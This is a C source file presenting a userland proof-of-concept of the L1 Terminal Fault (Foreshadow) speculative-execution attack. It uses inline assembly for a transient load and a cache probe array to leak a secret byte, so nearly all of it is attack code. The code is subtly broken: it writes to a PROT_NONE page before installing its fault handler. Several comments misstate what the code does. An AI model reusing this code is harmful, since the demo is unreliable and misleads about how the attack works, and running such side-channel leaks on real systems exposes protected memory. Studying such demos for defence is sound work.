#include "utils.c"

// --- L1 Terminal Fault (L1TF / Foreshadow) ---

uint8_t secret_l1tf_byte = 'L';
volatile uint8_t *g_l1tf_secret_page = NULL; // Will point to an unmapped page

static sigjmp_buf jmpbuf_l1tf;

void sigsegv_handler_l1tf(int sig)
{
    siglongjmp(jmpbuf_l1tf, 1);
}

int main()
{
    common_init();
    printf("\n--- Running L1 Terminal Fault (L1TF) Demo ---\n");

    // Allocate an executable page with PROT_NONE to ensure a fault on access.
    // A true L1TF requires the page to be NOT PRESENT in the PTE, but potentially
    // *aliased* or *cached* from a different context (e.g., SMM, other VM).
    // This cannot be perfectly simulated in userland. We are simulating the faulting access.
    size_t page_size = getpagesize();
    g_l1tf_secret_page = (uint8_t *)mmap(NULL, page_size, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (g_l1tf_secret_page == MAP_FAILED)
    {
        perror("mmap");
        return 1;
    }
    // Place a "secret" at an offset within this unmapped page.
    // Architecturally, this write will cause a fault if PROT_NONE.
    // In a real L1TF, this data would be put there by a privileged entity.
    *(g_l1tf_secret_page + 0x100) = secret_l1tf_byte;

    // Set up signal handler to catch segmentation faults
    if (signal(SIGSEGV, sigsegv_handler_l1tf) == SIG_ERR)
    {
        perror("signal");
        munmap((void *)g_l1tf_secret_page, page_size);
        return 1;
    }

    printf("Attempting L1TF-style transient read from unmapped page...\n");

    for (int attempt = 0; attempt < 500; ++attempt)
    {
        flush_probe_array();

        if (sigsetjmp(jmpbuf_l1tf, 1) == 0)
        {
            // The core of L1TF: speculative load from a "not present" but L1-cached address.
            // This is the same inline assembly as Meltdown, but the context (PTE state) is key.
            // The address must be in a general-purpose register L1TF prefers (r12, r13, r14, r9, r10, rdi, rdx).
            __asm__ __volatile__(
                "movq (%0), %%rax\n\t"         // Speculatively load from g_l1tf_secret_page+0x100 into RAX
                                               // This triggers the L1TF condition (PTE.P=0)
                "shl $12, %%rax\n\t"           // Shift RAX (leaked byte) by cache line size
                "movq (%1, %%rax, 1), %%rbx\n" // Access probe_array[leaked_byte * CACHE_LINE_SIZE]
                :
                : "r"(g_l1tf_secret_page + 0x100), "r"(probe_array)
                : "rax", "rbx");
        }
        else
        {
            _mm_lfence(); // Fence to ensure speculative writes to cache are visible
        }

        // --- Measurement Phase ---
        if (perform_measurement(secret_l1tf_byte, "L1TF secret"))
        {
            munmap((void *)g_l1tf_secret_page, page_size);
            return 0;
        }
    }

    printf("Failed to leak the L1TF secret byte.\n");
    printf("Actual secret data: %c\n", secret_l1tf_byte);
    munmap((void *)g_l1tf_secret_page, page_size);
    return 0;
}